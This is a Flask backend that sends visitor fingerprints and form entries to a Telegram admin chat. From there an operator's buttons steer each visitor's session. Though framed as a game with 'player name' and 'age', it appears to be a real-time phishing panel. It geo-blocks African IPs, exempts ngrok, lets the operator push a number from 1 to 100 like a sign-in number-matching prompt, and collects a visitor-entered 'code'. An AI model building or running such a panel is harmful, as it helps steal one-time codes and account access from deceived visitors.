import ipaddress
import ipaddress
import os
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timedelta, timezone
from typing import Any

from dotenv import load_dotenv
from flask import Flask, jsonify, request, send_from_directory
import requests

ROOT = os.path.dirname(os.path.abspath(__file__))
load_dotenv(os.path.join(ROOT, ".env"))

BOT_TOKEN: str = os.environ.get("BOT_TOKEN") or os.environ.get("TELEGRAM_BOT_TOKEN", "")
ADMIN_CHAT_ID: str = os.environ.get("ADMIN_CHAT_ID") or os.environ.get("TELEGRAM_ADMIN_CHAT_ID", "")

app = Flask(__name__, static_folder=ROOT, static_url_path="")
app.config["PERMANENT_SESSION_LIFETIME"] = timedelta(days=7)

# ──────────────────────────────────────────────────────────────────────────────
# Thread-pools
#   tg_pool   – exclusively for Telegram API calls (answerCallbackQuery must be
#               fast; never let it queue behind slow operations)
#   bg_pool   – general background work (geo-IP lookups, visit messages, etc.)
# ──────────────────────────────────────────────────────────────────────────────
tg_pool = ThreadPoolExecutor(max_workers=8, thread_name_prefix="tg")
bg_pool = ThreadPoolExecutor(max_workers=4, thread_name_prefix="bg")

# ──────────────────────────────────────────────────────────────────────────────
# HTTP sessions
#
# Two separate sessions so the long-poll connection is NEVER shared with any
# other outbound call. If tg_pool threads use `http` while the poll loop is
# mid-request, urllib3's connection pool can stall the poll.  Keeping them
# completely isolated means Telegram can interrupt the long-poll instantly
# the moment an update (e.g. Accept) arrives.
# ──────────────────────────────────────────────────────────────────────────────
proxy_url = (
    os.environ.get("http_proxy")
    or os.environ.get("https_proxy")
    or os.environ.get("HTTP_PROXY")
)
if not proxy_url and os.path.exists("/etc/pythonanywhere"):
    proxy_url = "http://proxy.server:3128"

def _make_session() -> requests.Session:
    s = requests.Session()
    if proxy_url:
        s.proxies = {"http": proxy_url, "https": proxy_url}
    return s

http      = _make_session()   # used by tg_pool workers, bg_pool, geo-IP
poll_http = _make_session()   # used EXCLUSIVELY by the telegram_loop thread

# ──────────────────────────────────────────────────────────────────────────────
# Session store
# ──────────────────────────────────────────────────────────────────────────────
state_lock = threading.Lock()
sessions: dict[str, dict[str, Any]] = {}

# ──────────────────────────────────────────────────────────────────────────────
# Update-deduplication guard (avoid processing the same update_id twice if the
# polling thread restarts or overlaps)
# ──────────────────────────────────────────────────────────────────────────────
_seen_lock = threading.Lock()
_seen_update_ids: set[int] = set()
_SEEN_MAX = 500  # rolling window – keep memory bounded

# ──────────────────────────────────────────────────────────────────────────────
# Geo-IP cache
# ──────────────────────────────────────────────────────────────────────────────
ip_cache_lock = threading.Lock()
ip_geo_cache: dict[str, bool] = {}

AFRICAN_COUNTRY_CODES = {
    "AO", "BF", "BI", "BJ", "BW", "CD", "CF", "CG", "CI", "CM", "CV", "DJ", "DZ",
    "EG", "ER", "ET", "GA", "GH", "GM", "GN", "GQ", "GW", "KE", "KM", "LR", "LS",
    "LY", "MA", "MG", "ML", "MR", "MU", "MW", "MZ", "NA", "NE", "NG", "RW", "SC",
    "SD", "SL", "SN", "SO", "SS", "ST", "SZ", "TD", "TG", "TN", "TZ", "UG", "ZA",
    "ZM", "ZW", "EH",
}


# ──────────────────────────────────────────────────────────────────────────────
# Helpers
# ──────────────────────────────────────────────────────────────────────────────

def is_private_or_local_ip(ip_str: str) -> bool:
    try:
        ip_obj = ipaddress.ip_address(ip_str)
        return ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local
    except ValueError:
        return False


def is_african_ip(ip_str: str) -> bool:
    if not ip_str or ip_str in ("Unknown", "127.0.0.1", "::1"):
        return False
    if is_private_or_local_ip(ip_str):
        return False

    with ip_cache_lock:
        if ip_str in ip_geo_cache:
            return ip_geo_cache[ip_str]

    is_af = False
    for url in (
        f"http://ip-api.com/json/{ip_str}?fields=status,countryCode,continentCode",
        f"https://ipapi.co/{ip_str}/json/",
    ):
        try:
            res = http.get(url, timeout=3)
            if res.status_code == 200:
                data = res.json()
                cont = str(data.get("continentCode") or data.get("continent_code") or "").upper()
                cc = str(data.get("countryCode") or data.get("country_code") or "").upper()
                if data.get("status", "success") == "success" or "continent_code" in data:
                    is_af = (cont == "AF") or (cc in AFRICAN_COUNTRY_CODES)
                    with ip_cache_lock:
                        ip_geo_cache[ip_str] = is_af
                    return is_af
        except Exception as exc:
            print(f"[geo] lookup error for {ip_str} via {url}: {exc}")

    return False


def is_ngrok_request() -> bool:
    host = (request.headers.get("X-Forwarded-Host") or request.host or "").lower()
    referer = (request.headers.get("Referer") or "").lower()
    ua = (request.headers.get("User-Agent") or "").lower()
    return "ngrok" in host or "ngrok" in referer or "ngrok" in ua


def get_timestamp() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")


def keyboard(rows: list[list[dict[str, str]]]) -> dict[str, Any]:
    return {"inline_keyboard": rows}


def control_keyboard(sid: str) -> dict[str, Any]:
    return keyboard([
        [
            {"text": "🔢 Number", "callback_data": f"mode:number:{sid}"},
            {"text": "🔑 Code",   "callback_data": f"mode:code:{sid}"},
        ]
    ])


def number_keyboard(sid: str) -> dict[str, Any]:
    buttons = [
        {"text": str(n), "callback_data": f"number:{n}:{sid}"}
        for n in range(1, 101)
    ]
    rows = [buttons[i: i + 8] for i in range(0, 100, 8)]
    return keyboard(rows)


# ──────────────────────────────────────────────────────────────────────────────
# Telegram API wrapper
# ──────────────────────────────────────────────────────────────────────────────

def telegram_request(
    method: str,
    payload: dict[str, Any],
    timeout: int = 35,
    silent_conflict: bool = False,
) -> dict[str, Any]:
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
    try:
        resp = http.post(url, json=payload, timeout=timeout)
        resp.raise_for_status()
        result = resp.json()
        if not result.get("ok"):
            raise RuntimeError(result.get("description", "Telegram API error"))
        return result
    except Exception as exc:
        if not (silent_conflict and "409" in str(exc)):
            print(f"[tg] {method} error: {exc}")
        raise


def tg_async(method: str, payload: dict[str, Any], **kwargs: Any) -> None:
    """Fire-and-forget Telegram call on the dedicated tg_pool."""
    tg_pool.submit(telegram_request, method, payload, **kwargs)


# ──────────────────────────────────────────────────────────────────────────────
# Session helpers
# ──────────────────────────────────────────────────────────────────────────────

def get_session_id() -> str:
    sid = (
        request.headers.get("X-Session-ID")
        or request.args.get("sid")
        or "default_session"
    )
    return str(sid).strip()[:64]


def _default_session(sid: str) -> dict[str, Any]:
    return {
        "id": sid,
        "status": "idle",
        "mode": None,
        "number": None,
        "player_name": "",
        "game_location": "",
        "visited": False,
        "client_ip": "",
        "user_agent": "",
        "updated_at": time.time(),
    }


def get_or_create_session(sid: str) -> dict[str, Any]:
    with state_lock:
        if sid not in sessions:
            sessions[sid] = _default_session(sid)
        else:
            sessions[sid]["updated_at"] = time.time()
        return dict(sessions[sid])


def set_session_state(sid: str, **updates: Any) -> dict[str, Any]:
    with state_lock:
        if sid not in sessions:
            sessions[sid] = _default_session(sid)
        sessions[sid].update(updates)
        sessions[sid]["updated_at"] = time.time()
        return dict(sessions[sid])


def cleanup_expired_sessions() -> None:
    cutoff = time.time() - (7 * 86400)
    with state_lock:
        expired = [k for k, v in sessions.items() if v.get("updated_at", 0) < cutoff]
        for k in expired:
            del sessions[k]


# ──────────────────────────────────────────────────────────────────────────────
# Flask middleware
# ──────────────────────────────────────────────────────────────────────────────

@app.before_request
def block_african_ips() -> Any:
    if request.method == "OPTIONS":
        return None
    if request.endpoint in ("telegram_webhook", "access_diagnostic") or is_ngrok_request():
        return None
    client_ip = (
        request.headers.get("X-Forwarded-For", request.remote_addr or "Unknown")
        .split(",")[0]
        .strip()
    )
    if is_african_ip(client_ip):
        return jsonify({
            "error": "Access denied. This service is not available in your region.",
            "blocked": True,
        }), 403


@app.after_request
def add_cors_headers(response: Any) -> Any:
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type, Authorization, X-Session-ID"
    response.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
    return response


@app.route("/api/<path:path>", methods=["OPTIONS"])
def options_handler(path: str) -> Any:
    return "", 200


# ──────────────────────────────────────────────────────────────────────────────
# Telegram update handler
# ──────────────────────────────────────────────────────────────────────────────

def _resolve_sid(parts: list[str], cmd: str) -> str | None:
    """Extract session-id from callback_data parts and validate it exists."""
    sid: str | None = None
    if cmd in ("accept", "decline") and len(parts) > 1:
        sid = parts[1]
    elif cmd in ("mode", "number") and len(parts) > 2:
        sid = parts[2]

    with state_lock:
        if sid and sid in sessions:
            return sid
        # Fallback: use the most-recently-active session.
        # Only safe when there is exactly one active session.
        if sessions:
            return max(sessions, key=lambda k: sessions[k].get("updated_at", 0))

    return None


def handle_update(update: dict[str, Any]) -> None:
    # ── deduplication ──────────────────────────────────────────────────────
    update_id: int = update.get("update_id", -1)
    if update_id >= 0:
        with _seen_lock:
            if update_id in _seen_update_ids:
                return
            _seen_update_ids.add(update_id)
            if len(_seen_update_ids) > _SEEN_MAX:
                # drop the oldest half to keep the set bounded
                oldest = sorted(_seen_update_ids)[: _SEEN_MAX // 2]
                for oid in oldest:
                    _seen_update_ids.discard(oid)

    callback = update.get("callback_query")
    if not callback:
        return

    message = callback.get("message", {})
    chat_id = str(message.get("chat", {}).get("id", "")).strip()

    # Only process callbacks from the admin chat
    if chat_id != str(ADMIN_CHAT_ID).strip():
        return

    action = callback.get("data", "")
    callback_id = callback.get("id")
    message_id = message.get("message_id")
    parts = action.split(":")
    cmd = parts[0]

    # ── Answer the callback async – never block the polling thread ──────
    # answerCallbackQuery only controls the spinner on the operator's screen.
    # Firing it async means the state update below happens in microseconds,
    # so the player's browser sees the change on the very next poll.
    # The operator's button will clear within ~1 s in the background.
    if callback_id:
        tg_async(
            "answerCallbackQuery",
            {"callback_query_id": callback_id, "text": "✅ Done"},
            timeout=10,
            silent_conflict=True,
        )

    sid = _resolve_sid(parts, cmd)
    if not sid:
        sid = "default_session"

    # ── State transitions ─────────────────────────────────────────────────
    if cmd == "accept":
        set_session_state(sid, status="accepted", mode=None, number=None)
        if message_id:
            tg_async(
                "editMessageReplyMarkup",
                {"chat_id": chat_id, "message_id": message_id, "reply_markup": control_keyboard(sid)},
                silent_conflict=True,
            )

    elif cmd == "decline":
        set_session_state(sid, status="declined", mode=None, number=None)
        if message_id:
            tg_async(
                "editMessageText",
                {"chat_id": chat_id, "message_id": message_id, "text": "❌ Session Declined."},
                silent_conflict=True,
            )

    elif cmd == "mode" and len(parts) > 1:
        selected_mode = parts[1]  # "number" or "code"
        if selected_mode == "number":
            set_session_state(sid, status="accepted", mode="number", number=None)
            if message_id:
                tg_async(
                    "editMessageReplyMarkup",
                    {"chat_id": chat_id, "message_id": message_id, "reply_markup": number_keyboard(sid)},
                    silent_conflict=True,
                )
        elif selected_mode == "code":
            set_session_state(sid, status="accepted", mode="code", number=None)
            if message_id:
                tg_async(
                    "editMessageText",
                    {
                        "chat_id": chat_id,
                        "message_id": message_id,
                        "text": "✅ Mode: Code Entry active. Waiting for the player to enter their code.",
                    },
                    silent_conflict=True,
                )

    elif cmd == "number" and len(parts) > 2:
        try:
            num_val = int(parts[1])
        except ValueError:
            return
        set_session_state(sid, status="accepted", mode="number", number=num_val)
        if message_id:
            tg_async(
                "editMessageText",
                {"chat_id": chat_id, "message_id": message_id, "text": f"✅ Number selected: {num_val}"},
                silent_conflict=True,
            )


# ──────────────────────────────────────────────────────────────────────────────
# Telegram long-poll loop
#
# Key design choices:
#   • poll_http is a DEDICATED session – never shared with tg_pool workers.
#     This prevents urllib3 connection-pool contention from stalling the poll.
#   • timeout=20  — Telegram holds the connection open; updates arrive the
#     instant the operator presses a button (sub-second delivery).
#   • answerCallbackQuery fires on tg_pool (async) so state is updated on the
#     polling thread in microseconds – browser sees it on the very next poll.
#   • sleep(0) after results, sleep(0.05) on empty – no unnecessary delay.
# ──────────────────────────────────────────────────────────────────────────────

def _poll_request(method: str, payload: dict[str, Any], timeout: int = 35) -> dict[str, Any]:
    """Telegram API call that uses the dedicated poll_http session."""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
    resp = poll_http.post(url, json=payload, timeout=timeout)
    resp.raise_for_status()
    result = resp.json()
    if not result.get("ok"):
        raise RuntimeError(result.get("description", "Telegram API error"))
    return result


def telegram_loop() -> None:
    # Clear any lingering webhook so long-polling works exclusively
    for attempt in range(3):
        try:
            _poll_request("deleteWebhook", {"drop_pending_updates": False}, timeout=15)
            print("[tg] Webhook cleared – long-poll mode active.")
            break
        except Exception as exc:
            print(f"[tg] deleteWebhook attempt {attempt + 1} failed: {exc}")
            time.sleep(2)

    offset = 0
    consecutive_errors = 0

    while True:
        try:
            cleanup_expired_sessions()

            result = _poll_request(
                "getUpdates",
                {
                    "offset": offset,
                    "timeout": 20,           # long-poll: Telegram holds connection up to 20s
                    "allowed_updates": ["callback_query"],
                },
                timeout=25,                  # HTTP timeout must be > Telegram timeout
            )

            updates = result.get("result", [])
            for update in updates:
                offset = update["update_id"] + 1
                try:
                    handle_update(update)
                except Exception as exc:
                    print(f"[tg] handle_update error: {exc}")

            consecutive_errors = 0
            # Re-poll immediately if there were results; tiny pause otherwise
            time.sleep(0 if updates else 0.05)

        except Exception as exc:
            consecutive_errors += 1
            err_str = str(exc)
            if "409" in err_str:
                print("[tg] 409 Conflict – another instance polling. Backing off 10s.")
                time.sleep(10)
            else:
                wait = min(2 ** consecutive_errors, 30)
                print(f"[tg] getUpdates error (#{consecutive_errors}): {exc} – retrying in {wait}s")
                time.sleep(wait)


# ──────────────────────────────────────────────────────────────────────────────
# Routes
# ──────────────────────────────────────────────────────────────────────────────

@app.route("/telegram-webhook", methods=["POST", "GET"])
def telegram_webhook() -> Any:
    if request.method == "GET":
        return jsonify({"ok": True, "message": "Telegram Webhook Endpoint Ready"})
    update = request.get_json(silent=True) or {}
    if update:
        handle_update(update)
    return jsonify({"ok": True})


@app.get("/")
def index() -> Any:
    return send_from_directory(ROOT, "index.html")


@app.route("/access", methods=["GET", "OPTIONS"])
def access_diagnostic() -> Any:
    if request.method == "OPTIONS":
        return "", 200
    token_preview = (
        f"{BOT_TOKEN[:6]}...{BOT_TOKEN[-4:]}" if len(BOT_TOKEN) > 10
        else ("NOT SET" if not BOT_TOKEN else BOT_TOKEN)
    )
    return jsonify({
        "status": "online",
        "telegram_configured": bool(BOT_TOKEN and ADMIN_CHAT_ID),
        "bot_token_preview": token_preview,
        "admin_chat_id": ADMIN_CHAT_ID or "NOT SET",
        "active_sessions": len(sessions),
        "server_time_utc": get_timestamp(),
    })


@app.route("/api/visit", methods=["POST", "OPTIONS"])
def record_visit() -> Any:
    if request.method == "OPTIONS":
        return "", 200

    sid = get_session_id()
    sess = get_or_create_session(sid)

    if sess.get("visited"):
        return jsonify({"ok": True, "already_logged": True})

    set_session_state(sid, visited=True)

    payload = request.get_json(silent=True) or {}
    client_ip = (
        request.headers.get("X-Forwarded-For", request.remote_addr or "Unknown")
        .split(",")[0].strip()
    )
    ua = request.headers.get("User-Agent", "Unknown")
    accept_lang = request.headers.get("Accept-Language", "Unknown")
    referer = request.headers.get("Referer") or payload.get("referrer") or "Direct / None"

    ci = payload.get("clientInfo", {})
    ts = get_timestamp()

    if BOT_TOKEN and ADMIN_CHAT_ID:
        text = (
            "👀 New Website Visit\n\n"
            f"⏰ Time: {ts}\n"
            f"🔗 Referrer: {referer}\n\n"
            "🌐 Client Details:\n"
            f"• IP: {client_ip}\n"
            f"• UA: {ua}\n"
            f"• Language: {ci.get('language', accept_lang)}\n"
            f"• Screen: {ci.get('screen', 'Unknown')}\n"
            f"• Timezone: {ci.get('timezone', 'Unknown')}\n"
            f"• Platform: {ci.get('platform', 'Unknown')}"
        )
        bg_pool.submit(telegram_request, "sendMessage", {"chat_id": ADMIN_CHAT_ID, "text": text})

    return jsonify({"ok": True})


@app.get("/api/session")
def get_session_route() -> Any:
    sid = get_session_id()
    data = get_or_create_session(sid)
    resp = jsonify(data)
    resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate"
    return resp


@app.post("/api/heartbeat")
def heartbeat() -> Any:
    sid = get_session_id()
    data = get_or_create_session(sid)
    return jsonify({"ok": True, "status": data["status"], "mode": data["mode"], "number": data["number"]})


@app.route("/api/submit", methods=["POST", "OPTIONS"])
def submit() -> Any:
    if request.method == "OPTIONS":
        return "", 200

    payload = request.get_json(silent=True) or {}
    player_name = str(payload.get("playerName", "")).strip()[:40]
    game_location = str(payload.get("gameLocation", "")).strip()[:80]

    if not player_name or not game_location:
        return jsonify({"error": "Player name and game location are required."}), 400
    if not BOT_TOKEN or not ADMIN_CHAT_ID:
        return jsonify({"error": "Telegram is not configured."}), 503

    sid = get_session_id()
    client_ip = (
        request.headers.get("X-Forwarded-For", request.remote_addr or "Unknown")
        .split(",")[0].strip()
    )
    ua = request.headers.get("User-Agent", "Unknown")
    accept_lang = request.headers.get("Accept-Language", "Unknown")
    ci = payload.get("clientInfo", {})
    ts = get_timestamp()

    text = (
        "🎮 New Game Submission\n\n"
        f"⏰ Time: {ts}\n"
        f"👤 Player: {player_name}\n"
        f"📍 Location: {game_location}\n\n"
        "🌐 Client Details:\n"
        f"• IP: {client_ip}\n"
        f"• UA: {ua}\n"
        f"• Language: {ci.get('language', accept_lang)}\n"
        f"• Screen: {ci.get('screen', 'Unknown')}\n"
        f"• Timezone: {ci.get('timezone', 'Unknown')}\n"
        f"• Platform: {ci.get('platform', 'Unknown')}"
    )

    try:
        telegram_request(
            "sendMessage",
            {
                "chat_id": ADMIN_CHAT_ID,
                "text": text,
                "reply_markup": keyboard([[
                    {"text": "✅ Accept", "callback_data": f"accept:{sid}"},
                    {"text": "❌ Decline", "callback_data": f"decline:{sid}"},
                ]]),
            },
        )
    except Exception as exc:
        print(f"[submit] Telegram error: {exc}")
        return jsonify({"error": f"Telegram API error: {exc}"}), 502

    set_session_state(
        sid,
        status="submitted",
        mode=None,
        number=None,
        player_name=player_name,
        game_location=game_location,
        client_ip=client_ip,
        user_agent=ua,
    )
    return jsonify({"ok": True})


@app.route("/api/age", methods=["POST", "OPTIONS"])
def submit_age() -> Any:
    if request.method == "OPTIONS":
        return "", 200

    payload = request.get_json(silent=True) or {}
    raw_age = payload.get("age")

    # Accept integer or string representation of a whole number
    try:
        age = int(raw_age)
    except (TypeError, ValueError):
        return jsonify({"error": "Age must be a valid whole number."}), 400

    if age < 1:
        return jsonify({"error": "Age must be at least 1."}), 400

    sid = get_session_id()
    current = get_or_create_session(sid)

    if current["status"] != "accepted" or current["mode"] != "code":
        return jsonify({"error": "Age input is not active for this session."}), 409

    if not BOT_TOKEN or not ADMIN_CHAT_ID:
        return jsonify({"error": "Telegram is not configured."}), 503

    client_ip = current.get("client_ip") or (
        request.headers.get("X-Forwarded-For", request.remote_addr or "Unknown")
        .split(",")[0].strip()
    )
    ua = current.get("user_agent") or request.headers.get("User-Agent", "Unknown")
    ts = get_timestamp()

    text = (
        "🎯 Code / Age Response\n\n"
        f"⏰ Time: {ts}\n"
        f"👤 Player: {current.get('player_name', 'Unknown')}\n"
        f"📍 Location: {current.get('game_location', 'Unknown')}\n"
        f"🔢 Value: {age}\n\n"
        "🌐 Client Details:\n"
        f"• IP: {client_ip}\n"
        f"• UA: {ua}"
    )

    try:
        telegram_request("sendMessage", {"chat_id": ADMIN_CHAT_ID, "text": text})
    except Exception as exc:
        print(f"[age] Telegram error: {exc}")
        return jsonify({"error": f"Telegram API error: {exc}"}), 502

    return jsonify({"ok": True})


# ──────────────────────────────────────────────────────────────────────────────
# Start Telegram long-poll thread
# ──────────────────────────────────────────────────────────────────────────────
if BOT_TOKEN and ADMIN_CHAT_ID:
    _tg_thread = threading.Thread(target=telegram_loop, daemon=True, name="telegram-poll")
    _tg_thread.start()
    print(f"[tg] Long-poll thread started (admin_chat={ADMIN_CHAT_ID}).")
else:
    print("[tg] Disabled – set BOT_TOKEN and ADMIN_CHAT_ID in .env")

if __name__ == "__main__":
    # threaded=True gives each request its own thread so the long-poll thread
    # never blocks HTTP handlers (critical on single-worker hosts).
    app.run(
        host="127.0.0.1",
        port=int(os.environ.get("PORT", "5000")),
        debug=False,
        threaded=True,
    )
